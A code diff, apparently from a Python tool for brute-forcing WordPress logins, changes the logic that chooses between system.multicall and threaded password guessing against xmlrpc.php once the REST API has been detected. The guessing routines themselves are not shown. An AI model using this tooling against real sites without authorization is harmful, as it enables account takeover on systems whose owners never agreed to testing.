@@ -678,31 +678,38 @@ async def main():
                 )
                 return
 
-        # Ask the user if they want to use system.multicall
-        multicall_choice = input(
-            f"{Fore.YELLOW}Do you want to use system.multicall? (y/n): "
-        ).lower()
-
-        if multicall_choice == "y":
-            rest_api_detected = await detect_rest_api_route(url, session)
-            if rest_api_detected is not None:
-                logging.error(
-                    "system.multicall was modified in version 4.4 to invalidate all calls "
-                    "after an invalid one was detected. Try again without multicall."
-                )
-                return
-
-            response_time = await start_multicall_async(
-                url + "/xmlrpc.php", users, passwords, session
-            )
-            if response_time:
-                logging.info("Analyzing response times")
-                await analyze_response_times([response_time])
+        # Ask the user if they want to use system.multicall, if we haven't already
+        # detected and used the REST API. Unrelated to the REST API itself, multicall
+        # won't work on versions of WordPress which have REST Infrastructure (>=4.4)
+        rest_api_multicall_warning = (
+            f"{Fore.RED}REST API detected: Skipping multicall prompt because system.multicall was\n"
+            "modified in versions >=4.4 to invalidate all calls after an invalid one was detected."
+            "\nContinue to try brute force method."
+        )
+        if rest_api_used:
+            print(rest_api_multicall_warning)
         else:
-            # Get the number of threads to use from the user only if not using multicall
-            threads = int(input(f"{Fore.YELLOW}Enter the number of threads to use for brute force: "))
+            multicall_choice = input(
+                f"{Fore.YELLOW}Do you want to use system.multicall? (y/n): "
+            ).lower()
 
-            await start_bruteforce_async(url + "/xmlrpc.php", users, passwords, threads)
+            if multicall_choice == "y":
+                rest_api_route = await detect_rest_api_route(url, session)
+                if rest_api_route is not None:
+                    print(rest_api_multicall_warning)
+                else:
+                    response_time = await start_multicall_async(
+                        url + "/xmlrpc.php", users, passwords, session
+                    )
+                    if response_time:
+                        logging.info("Analyzing response times")
+                        await analyze_response_times([response_time])
+                    return
+
+        # Get the number of threads to use from the user only if not using multicall
+        threads = int(input(f"{Fore.YELLOW}Enter the number of threads to use for brute force: "))
+
+        await start_bruteforce_async(url + "/xmlrpc.php", users, passwords, threads)
 
 # ==================================================================================================
 # ==================================================================================================
